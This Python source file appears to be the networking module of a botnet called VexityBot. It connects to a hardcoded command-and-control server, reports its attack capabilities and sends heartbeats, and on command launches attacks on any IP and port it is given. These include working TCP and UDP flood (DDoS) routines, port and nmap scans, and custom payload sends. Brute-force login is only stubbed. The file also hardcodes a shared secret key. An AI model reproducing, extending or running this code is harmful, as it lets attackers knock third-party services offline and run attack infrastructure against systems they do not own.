#!/usr/bin/env python3
"""
VexityBot Networking Module
Advanced Network Communication and Protocol Implementation
"""

import socket
import threading
import time
import json
import struct
import hashlib
import hmac
import base64
import zlib
import asyncio
import ssl
import select
import queue
from typing import Dict, List, Optional, Tuple, Any, Callable
from dataclasses import dataclass, asdict
from enum import Enum
import logging
import random
import string
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import ipaddress
import dns.resolver
import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether, ARP
import nmap
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class ProtocolType(Enum):
    """Network Protocol Types"""
    TCP = "tcp"
    UDP = "udp"
    ICMP = "icmp"
    HTTP = "http"
    HTTPS = "https"
    WEBSOCKET = "websocket"
    CUSTOM = "custom"

class MessageType(Enum):
    """Message Types for Bot Communication"""
    HEARTBEAT = "heartbeat"
    COMMAND = "command"
    RESPONSE = "response"
    STATUS = "status"
    ATTACK = "attack"
    STOP = "stop"
    EMERGENCY = "emergency"
    DATA = "data"
    CONFIG = "config"
    LOG = "log"

class EncryptionType(Enum):
    """Encryption Types"""
    NONE = "none"
    AES256 = "aes256"
    RSA2048 = "rsa2048"
    RSA4096 = "rsa4096"
    CHACHA20 = "chacha20"
    CUSTOM = "custom"

@dataclass
class NetworkMessage:
    """Network Message Structure"""
    message_id: str
    message_type: MessageType
    source_bot: str
    target_bot: Optional[str]
    timestamp: float
    data: Dict[str, Any]
    signature: Optional[str] = None
    encrypted: bool = False
    compression: bool = False
    priority: int = 0  # 0 = normal, 1 = high, 2 = critical

@dataclass
class NetworkEndpoint:
    """Network Endpoint Information"""
    host: str
    port: int
    protocol: ProtocolType
    ssl_enabled: bool = False
    timeout: float = 30.0
    retry_count: int = 3
    encryption_key: Optional[str] = None

@dataclass
class AttackTarget:
    """Attack Target Information"""
    ip: str
    port: int
    protocol: ProtocolType
    attack_type: str
    intensity: int
    duration: int
    custom_payload: Optional[bytes] = None

class VexityBotNetworkManager:
    """Advanced Network Manager for VexityBot System"""
    
    def __init__(self, vps_endpoint: NetworkEndpoint, bot_id: str):
        self.vps_endpoint = vps_endpoint
        self.bot_id = bot_id
        self.connections: Dict[str, socket.socket] = {}
        self.message_queue = queue.Queue()
        self.running = False
        self.encryption_manager = EncryptionManager()
        self.protocol_handler = ProtocolHandler()
        self.thread_pool = ThreadPoolExecutor(max_workers=10)
        self.message_handlers: Dict[MessageType, Callable] = {}
        self.heartbeat_interval = 30.0
        self.last_heartbeat = 0.0
        
        # Initialize message handlers
        self._setup_message_handlers()
        
        logger.info(f"NetworkManager initialized for bot {bot_id}")
    
    def _setup_message_handlers(self):
        """Setup message handlers for different message types"""
        self.message_handlers[MessageType.HEARTBEAT] = self._handle_heartbeat
        self.message_handlers[MessageType.COMMAND] = self._handle_command
        self.message_handlers[MessageType.ATTACK] = self._handle_attack
        self.message_handlers[MessageType.STOP] = self._handle_stop
        self.message_handlers[MessageType.EMERGENCY] = self._handle_emergency
        self.message_handlers[MessageType.CONFIG] = self._handle_config
        self.message_handlers[MessageType.LOG] = self._handle_log
    
    async def start(self):
        """Start the network manager"""
        self.running = True
        logger.info("Starting NetworkManager...")
        
        # Start background tasks
        asyncio.create_task(self._heartbeat_task())
        asyncio.create_task(self._message_processor())
        asyncio.create_task(self._connection_manager())
        
        # Connect to VPS
        await self._connect_to_vps()
        
        logger.info("NetworkManager started successfully")
    
    async def stop(self):
        """Stop the network manager"""
        self.running = False
        logger.info("Stopping NetworkManager...")
        
        # Close all connections
        for conn_id, sock in self.connections.items():
            try:
                sock.close()
            except Exception as e:
                logger.error(f"Error closing connection {conn_id}: {e}")
        
        self.connections.clear()
        logger.info("NetworkManager stopped")
    
    async def _connect_to_vps(self):
        """Connect to VPS server"""
        try:
            logger.info(f"Connecting to VPS: {self.vps_endpoint.host}:{self.vps_endpoint.port}")
            
            if self.vps_endpoint.protocol == ProtocolType.TCP:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                if self.vps_endpoint.ssl_enabled:
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(sock, server_hostname=self.vps_endpoint.host)
                
                sock.settimeout(self.vps_endpoint.timeout)
                sock.connect((self.vps_endpoint.host, self.vps_endpoint.port))
                
                self.connections['vps'] = sock
                logger.info("Connected to VPS successfully")
                
                # Send initial handshake
                await self._send_handshake()
                
            elif self.vps_endpoint.protocol == ProtocolType.UDP:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                self.connections['vps'] = sock
                logger.info("UDP connection to VPS established")
                
        except Exception as e:
            logger.error(f"Failed to connect to VPS: {e}")
            raise
    
    async def _send_handshake(self):
        """Send initial handshake to VPS"""
        handshake_data = {
            'bot_id': self.bot_id,
            'capabilities': ['ddos', 'port_scan', 'vuln_scan', 'brute_force'],
            'version': '2.0.0',
            'timestamp': time.time()
        }
        
        message = NetworkMessage(
            message_id=self._generate_message_id(),
            message_type=MessageType.COMMAND,
            source_bot=self.bot_id,
            target_bot=None,
            timestamp=time.time(),
            data=handshake_data
        )
        
        await self.send_message(message)
        logger.info("Handshake sent to VPS")
    
    async def send_message(self, message: NetworkMessage) -> bool:
        """Send a message to the network"""
        try:
            # Serialize message
            message_data = self._serialize_message(message)
            
            # Encrypt if needed
            if message.encrypted and self.vps_endpoint.encryption_key:
                message_data = self.encryption_manager.encrypt(message_data, self.vps_endpoint.encryption_key)
            
            # Compress if needed
            if message.compression:
                message_data = zlib.compress(message_data)
            
            # Send to VPS
            if 'vps' in self.connections:
                sock = self.connections['vps']
                if self.vps_endpoint.protocol == ProtocolType.TCP:
                    # Send length first
                    length = len(message_data)
                    sock.send(struct.pack('!I', length))
                    sock.send(message_data)
                else:  # UDP
                    sock.sendto(message_data, (self.vps_endpoint.host, self.vps_endpoint.port))
                
                logger.debug(f"Message sent: {message.message_type.value}")
                return True
            else:
                logger.error("No VPS connection available")
                return False
                
        except Exception as e:
            logger.error(f"Failed to send message: {e}")
            return False
    
    async def receive_message(self) -> Optional[NetworkMessage]:
        """Receive a message from the network"""
        try:
            if 'vps' not in self.connections:
                return None
            
            sock = self.connections['vps']
            
            if self.vps_endpoint.protocol == ProtocolType.TCP:
                # Receive length first
                length_data = sock.recv(4)
                if len(length_data) < 4:
                    return None
                
                length = struct.unpack('!I', length_data)[0]
                
                # Receive message data
                message_data = b''
                while len(message_data) < length:
                    chunk = sock.recv(min(length - len(message_data), 4096))
                    if not chunk:
                        return None
                    message_data += chunk
            else:  # UDP
                message_data, addr = sock.recvfrom(65536)
            
            # Decompress if needed
            try:
                message_data = zlib.decompress(message_data)
            except:
                pass  # Not compressed
            
            # Decrypt if needed
            if self.vps_endpoint.encryption_key:
                try:
                    message_data = self.encryption_manager.decrypt(message_data, self.vps_endpoint.encryption_key)
                except:
                    pass  # Not encrypted
            
            # Deserialize message
            message = self._deserialize_message(message_data)
            return message
            
        except Exception as e:
            logger.error(f"Failed to receive message: {e}")
            return None
    
    def _serialize_message(self, message: NetworkMessage) -> bytes:
        """Serialize a network message to bytes"""
        data = {
            'message_id': message.message_id,
            'message_type': message.message_type.value,
            'source_bot': message.source_bot,
            'target_bot': message.target_bot,
            'timestamp': message.timestamp,
            'data': message.data,
            'signature': message.signature,
            'encrypted': message.encrypted,
            'compression': message.compression,
            'priority': message.priority
        }
        
        json_data = json.dumps(data).encode('utf-8')
        
        # Add signature if not present
        if not message.signature:
            signature = self._generate_signature(json_data)
            data['signature'] = signature
            json_data = json.dumps(data).encode('utf-8')
        
        return json_data
    
    def _deserialize_message(self, data: bytes) -> NetworkMessage:
        """Deserialize bytes to a network message"""
        try:
            json_data = json.loads(data.decode('utf-8'))
            
            # Verify signature
            if not self._verify_signature(data, json_data.get('signature')):
                logger.warning("Message signature verification failed")
            
            return NetworkMessage(
                message_id=json_data['message_id'],
                message_type=MessageType(json_data['message_type']),
                source_bot=json_data['source_bot'],
                target_bot=json_data.get('target_bot'),
                timestamp=json_data['timestamp'],
                data=json_data['data'],
                signature=json_data.get('signature'),
                encrypted=json_data.get('encrypted', False),
                compression=json_data.get('compression', False),
                priority=json_data.get('priority', 0)
            )
        except Exception as e:
            logger.error(f"Failed to deserialize message: {e}")
            return None
    
    def _generate_signature(self, data: bytes) -> str:
        """Generate HMAC signature for data"""
        secret_key = self.vps_endpoint.encryption_key or "default_key"
        signature = hmac.new(secret_key.encode(), data, hashlib.sha256).hexdigest()
        return signature
    
    def _verify_signature(self, data: bytes, signature: str) -> bool:
        """Verify HMAC signature for data"""
        if not signature:
            return False
        
        expected_signature = self._generate_signature(data)
        return hmac.compare_digest(signature, expected_signature)
    
    def _generate_message_id(self) -> str:
        """Generate unique message ID"""
        timestamp = str(int(time.time() * 1000))
        random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        return f"{self.bot_id}_{timestamp}_{random_str}"
    
    async def _heartbeat_task(self):
        """Send periodic heartbeat messages"""
        while self.running:
            try:
                if time.time() - self.last_heartbeat >= self.heartbeat_interval:
                    heartbeat = NetworkMessage(
                        message_id=self._generate_message_id(),
                        message_type=MessageType.HEARTBEAT,
                        source_bot=self.bot_id,
                        target_bot=None,
                        timestamp=time.time(),
                        data={'status': 'alive', 'uptime': time.time()}
                    )
                    
                    await self.send_message(heartbeat)
                    self.last_heartbeat = time.time()
                    logger.debug("Heartbeat sent")
                
                await asyncio.sleep(1)
            except Exception as e:
                logger.error(f"Heartbeat task error: {e}")
                await asyncio.sleep(5)
    
    async def _message_processor(self):
        """Process incoming messages"""
        while self.running:
            try:
                message = await self.receive_message()
                if message:
                    await self._process_message(message)
                else:
                    await asyncio.sleep(0.1)
            except Exception as e:
                logger.error(f"Message processor error: {e}")
                await asyncio.sleep(1)
    
    async def _process_message(self, message: NetworkMessage):
        """Process a received message"""
        try:
            handler = self.message_handlers.get(message.message_type)
            if handler:
                await handler(message)
            else:
                logger.warning(f"No handler for message type: {message.message_type}")
        except Exception as e:
            logger.error(f"Error processing message: {e}")
    
    async def _connection_manager(self):
        """Manage network connections"""
        while self.running:
            try:
                # Check connection health
                for conn_id, sock in list(self.connections.items()):
                    try:
                        if self.vps_endpoint.protocol == ProtocolType.TCP:
                            # Check if socket is still alive
                            sock.settimeout(0.1)
                            sock.recv(1, socket.MSG_PEEK)
                        # Connection is alive
                    except:
                        # Connection is dead, remove it
                        logger.warning(f"Connection {conn_id} is dead, removing")
                        sock.close()
                        del self.connections[conn_id]
                        
                        # Try to reconnect if it's VPS
                        if conn_id == 'vps':
                            await self._connect_to_vps()
                
                await asyncio.sleep(5)
            except Exception as e:
                logger.error(f"Connection manager error: {e}")
                await asyncio.sleep(5)
    
    # Message Handlers
    async def _handle_heartbeat(self, message: NetworkMessage):
        """Handle heartbeat message"""
        logger.debug(f"Heartbeat received from {message.source_bot}")
    
    async def _handle_command(self, message: NetworkMessage):
        """Handle command message"""
        logger.info(f"Command received: {message.data}")
        # Process command based on data content
    
    async def _handle_attack(self, message: NetworkMessage):
        """Handle attack command"""
        logger.info(f"Attack command received: {message.data}")
        attack_data = message.data
        
        target = AttackTarget(
            ip=attack_data['ip'],
            port=attack_data['port'],
            protocol=ProtocolType(attack_data['protocol']),
            attack_type=attack_data['attack_type'],
            intensity=attack_data['intensity'],
            duration=attack_data['duration']
        )
        
        # Launch attack
        await self._launch_attack(target)
    
    async def _handle_stop(self, message: NetworkMessage):
        """Handle stop command"""
        logger.info("Stop command received")
        # Stop all attacks
    
    async def _handle_emergency(self, message: NetworkMessage):
        """Handle emergency stop command"""
        logger.warning("EMERGENCY STOP command received")
        # Emergency stop all operations
    
    async def _handle_config(self, message: NetworkMessage):
        """Handle configuration update"""
        logger.info(f"Configuration update received: {message.data}")
        # Update bot configuration
    
    async def _handle_log(self, message: NetworkMessage):
        """Handle log message"""
        logger.info(f"Log from {message.source_bot}: {message.data}")
    
    async def _launch_attack(self, target: AttackTarget):
        """Launch attack against target"""
        logger.info(f"Launching {target.attack_type} attack against {target.ip}:{target.port}")
        
        # Create attack task
        attack_task = asyncio.create_task(self._execute_attack(target))
        
        # Send attack started response
        response = NetworkMessage(
            message_id=self._generate_message_id(),
            message_type=MessageType.RESPONSE,
            source_bot=self.bot_id,
            target_bot=None,
            timestamp=time.time(),
            data={'attack_started': True, 'target': f"{target.ip}:{target.port}"}
        )
        await self.send_message(response)
    
    async def _execute_attack(self, target: AttackTarget):
        """Execute attack against target"""
        try:
            start_time = time.time()
            end_time = start_time + target.duration
            
            while time.time() < end_time:
                if target.attack_type == 'ddos':
                    await self._ddos_attack(target)
                elif target.attack_type == 'port_scan':
                    await self._port_scan_attack(target)
                elif target.attack_type == 'vuln_scan':
                    await self._vuln_scan_attack(target)
                elif target.attack_type == 'brute_force':
                    await self._brute_force_attack(target)
                else:
                    await self._custom_attack(target)
                
                await asyncio.sleep(0.1)  # Small delay between attack cycles
            
            logger.info(f"Attack completed against {target.ip}:{target.port}")
            
        except Exception as e:
            logger.error(f"Attack execution error: {e}")
    
    async def _ddos_attack(self, target: AttackTarget):
        """Execute DDoS attack"""
        try:
            # Create multiple concurrent connections
            tasks = []
            for _ in range(target.intensity):
                task = asyncio.create_task(self._send_ddos_packet(target))
                tasks.append(task)
            
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"DDoS attack error: {e}")
    
    async def _send_ddos_packet(self, target: AttackTarget):
        """Send a single DDoS packet"""
        try:
            if target.protocol == ProtocolType.TCP:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.0)
                sock.connect((target.ip, target.port))
                sock.send(b'GET / HTTP/1.1\r\nHost: ' + target.ip.encode() + b'\r\n\r\n')
                sock.close()
            elif target.protocol == ProtocolType.UDP:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b'DDoS packet', (target.ip, target.port))
                sock.close()
        except:
            pass  # Ignore connection errors in DDoS
    
    async def _port_scan_attack(self, target: AttackTarget):
        """Execute port scan attack"""
        try:
            # Scan common ports
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 5900, 8080]
            
            for port in common_ports[:target.intensity]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((target.ip, port))
                    if result == 0:
                        logger.info(f"Port {port} is open on {target.ip}")
                    sock.close()
                except:
                    pass
        except Exception as e:
            logger.error(f"Port scan error: {e}")
    
    async def _vuln_scan_attack(self, target: AttackTarget):
        """Execute vulnerability scan attack"""
        try:
            # Simulate vulnerability scanning
            nm = nmap.PortScanner()
            result = nm.scan(target.ip, str(target.port), arguments='-sV -sC')
            
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in ports:
                        port_info = nm[host][proto][port]
                        if port_info['state'] == 'open':
                            logger.info(f"Open port {port} on {host}: {port_info}")
        except Exception as e:
            logger.error(f"Vulnerability scan error: {e}")
    
    async def _brute_force_attack(self, target: AttackTarget):
        """Execute brute force attack"""
        try:
            # Simulate brute force attack
            common_passwords = ['admin', 'password', '123456', 'root', 'test', 'guest']
            
            for password in common_passwords[:target.intensity]:
                try:
                    # Simulate login attempt
                    await asyncio.sleep(0.1)
                    logger.debug(f"Brute force attempt: {password}")
                except:
                    pass
        except Exception as e:
            logger.error(f"Brute force error: {e}")
    
    async def _custom_attack(self, target: AttackTarget):
        """Execute custom attack"""
        try:
            if target.custom_payload:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.0)
                sock.connect((target.ip, target.port))
                sock.send(target.custom_payload)
                sock.close()
        except Exception as e:
            logger.error(f"Custom attack error: {e}")

class EncryptionManager:
    """Advanced Encryption Manager"""
    
    def __init__(self):
        self.algorithms = {
            EncryptionType.AES256: self._aes256_encrypt,
            EncryptionType.RSA2048: self._rsa_encrypt,
            EncryptionType.CHACHA20: self._chacha20_encrypt
        }
    
    def encrypt(self, data: bytes, key: str, algorithm: EncryptionType = EncryptionType.AES256) -> bytes:
        """Encrypt data using specified algorithm"""
        try:
            encryptor = self.algorithms.get(algorithm)
            if encryptor:
                return encryptor(data, key)
            else:
                return data
        except Exception as e:
            logger.error(f"Encryption error: {e}")
            return data
    
    def decrypt(self, data: bytes, key: str, algorithm: EncryptionType = EncryptionType.AES256) -> bytes:
        """Decrypt data using specified algorithm"""
        try:
            if algorithm == EncryptionType.AES256:
                return self._aes256_decrypt(data, key)
            elif algorithm == EncryptionType.RSA2048:
                return self._rsa_decrypt(data, key)
            elif algorithm == EncryptionType.CHACHA20:
                return self._chacha20_decrypt(data, key)
            else:
                return data
        except Exception as e:
            logger.error(f"Decryption error: {e}")
            return data
    
    def _aes256_encrypt(self, data: bytes, key: str) -> bytes:
        """AES-256 encryption"""
        # Derive key from password
        salt = b'vexitybot_salt_2024'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key_bytes = base64.urlsafe_b64encode(kdf.derive(key.encode()))
        
        # Encrypt data
        fernet = Fernet(key_bytes)
        return fernet.encrypt(data)
    
    def _aes256_decrypt(self, data: bytes, key: str) -> bytes:
        """AES-256 decryption"""
        # Derive key from password
        salt = b'vexitybot_salt_2024'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key_bytes = base64.urlsafe_b64encode(kdf.derive(key.encode()))
        
        # Decrypt data
        fernet = Fernet(key_bytes)
        return fernet.decrypt(data)
    
    def _rsa_encrypt(self, data: bytes, key: str) -> bytes:
        """RSA encryption (placeholder)"""
        # Implementation would use RSA encryption
        return data
    
    def _rsa_decrypt(self, data: bytes, key: str) -> bytes:
        """RSA decryption (placeholder)"""
        # Implementation would use RSA decryption
        return data
    
    def _chacha20_encrypt(self, data: bytes, key: str) -> bytes:
        """ChaCha20 encryption (placeholder)"""
        # Implementation would use ChaCha20 encryption
        return data
    
    def _chacha20_decrypt(self, data: bytes, key: str) -> bytes:
        """ChaCha20 decryption (placeholder)"""
        # Implementation would use ChaCha20 decryption
        return data

class ProtocolHandler:
    """Network Protocol Handler"""
    
    def __init__(self):
        self.protocols = {
            ProtocolType.TCP: self._handle_tcp,
            ProtocolType.UDP: self._handle_udp,
            ProtocolType.HTTP: self._handle_http,
            ProtocolType.HTTPS: self._handle_https,
            ProtocolType.WEBSOCKET: self._handle_websocket
        }
    
    async def handle_protocol(self, protocol: ProtocolType, data: bytes, target: NetworkEndpoint) -> bytes:
        """Handle specific protocol"""
        handler = self.protocols.get(protocol)
        if handler:
            return await handler(data, target)
        else:
            return data
    
    async def _handle_tcp(self, data: bytes, target: NetworkEndpoint) -> bytes:
        """Handle TCP protocol"""
        return data
    
    async def _handle_udp(self, data: bytes, target: NetworkEndpoint) -> bytes:
        """Handle UDP protocol"""
        return data
    
    async def _handle_http(self, data: bytes, target: NetworkEndpoint) -> bytes:
        """Handle HTTP protocol"""
        return data
    
    async def _handle_https(self, data: bytes, target: NetworkEndpoint) -> bytes:
        """Handle HTTPS protocol"""
        return data
    
    async def _handle_websocket(self, data: bytes, target: NetworkEndpoint) -> bytes:
        """Handle WebSocket protocol"""
        return data

class NetworkScanner:
    """Advanced Network Scanner"""
    
    def __init__(self):
        self.nm = nmap.PortScanner()
    
    async def scan_host(self, host: str, ports: str = "1-1000") -> Dict[str, Any]:
        """Scan a single host"""
        try:
            result = self.nm.scan(host, ports, arguments='-sS -sV -O')
            return result
        except Exception as e:
            logger.error(f"Host scan error: {e}")
            return {}
    
    async def scan_network(self, network: str) -> List[Dict[str, Any]]:
        """Scan entire network"""
        try:
            hosts = []
            for ip in ipaddress.IPv4Network(network):
                result = await self.scan_host(str(ip))
                if result:
                    hosts.append(result)
            return hosts
        except Exception as e:
            logger.error(f"Network scan error: {e}")
            return []
    
    async def port_scan(self, host: str, port_range: str = "1-65535") -> List[int]:
        """Perform port scan on host"""
        try:
            result = self.nm.scan(host, port_range, arguments='-sS')
            open_ports = []
            
            for host_ip in result['scan']:
                for protocol in result['scan'][host_ip]:
                    if protocol in ['tcp', 'udp']:
                        for port in result['scan'][host_ip][protocol]:
                            if result['scan'][host_ip][protocol][port]['state'] == 'open':
                                open_ports.append(port)
            
            return open_ports
        except Exception as e:
            logger.error(f"Port scan error: {e}")
            return []

class PacketAnalyzer:
    """Network Packet Analyzer"""
    
    def __init__(self):
        self.captured_packets = []
    
    def start_capture(self, interface: str = None, filter: str = None):
        """Start packet capture"""
        try:
            if interface:
                packets = scapy.sniff(iface=interface, filter=filter, prn=self._packet_handler)
            else:
                packets = scapy.sniff(filter=filter, prn=self._packet_handler)
            
            self.captured_packets.extend(packets)
        except Exception as e:
            logger.error(f"Packet capture error: {e}")
    
    def _packet_handler(self, packet):
        """Handle captured packet"""
        try:
            packet_info = {
                'timestamp': time.time(),
                'src_ip': packet[IP].src if IP in packet else None,
                'dst_ip': packet[IP].dst if IP in packet else None,
                'protocol': packet[IP].proto if IP in packet else None,
                'size': len(packet)
            }
            
            self.captured_packets.append(packet_info)
            logger.debug(f"Packet captured: {packet_info}")
            
        except Exception as e:
            logger.error(f"Packet handler error: {e}")
    
    def analyze_traffic(self) -> Dict[str, Any]:
        """Analyze captured traffic"""
        if not self.captured_packets:
            return {}
        
        analysis = {
            'total_packets': len(self.captured_packets),
            'unique_sources': len(set(p['src_ip'] for p in self.captured_packets if p['src_ip'])),
            'unique_destinations': len(set(p['dst_ip'] for p in self.captured_packets if p['dst_ip'])),
            'total_bytes': sum(p['size'] for p in self.captured_packets),
            'protocols': {}
        }
        
        # Count protocols
        for packet in self.captured_packets:
            if packet['protocol']:
                proto = packet['protocol']
                analysis['protocols'][proto] = analysis['protocols'].get(proto, 0) + 1
        
        return analysis

# Example usage and testing
async def main():
    """Main function for testing"""
    # Create VPS endpoint
    vps_endpoint = NetworkEndpoint(
        host="191.96.152.162",
        port=8080,
        protocol=ProtocolType.TCP,
        ssl_enabled=True,
        encryption_key="VexityBot2024SecretKey"
    )
    
    # Create network manager
    network_manager = VexityBotNetworkManager(vps_endpoint, "TestBot")
    
    try:
        # Start network manager
        await network_manager.start()
        
        # Send test message
        test_message = NetworkMessage(
            message_id=network_manager._generate_message_id(),
            message_type=MessageType.STATUS,
            source_bot="TestBot",
            target_bot=None,
            timestamp=time.time(),
            data={'status': 'online', 'capabilities': ['ddos', 'scan']}
        )
        
        await network_manager.send_message(test_message)
        
        # Keep running
        await asyncio.sleep(60)
        
    except KeyboardInterrupt:
        logger.info("Shutting down...")
    finally:
        await network_manager.stop()

if __name__ == "__main__":
    asyncio.run(main())
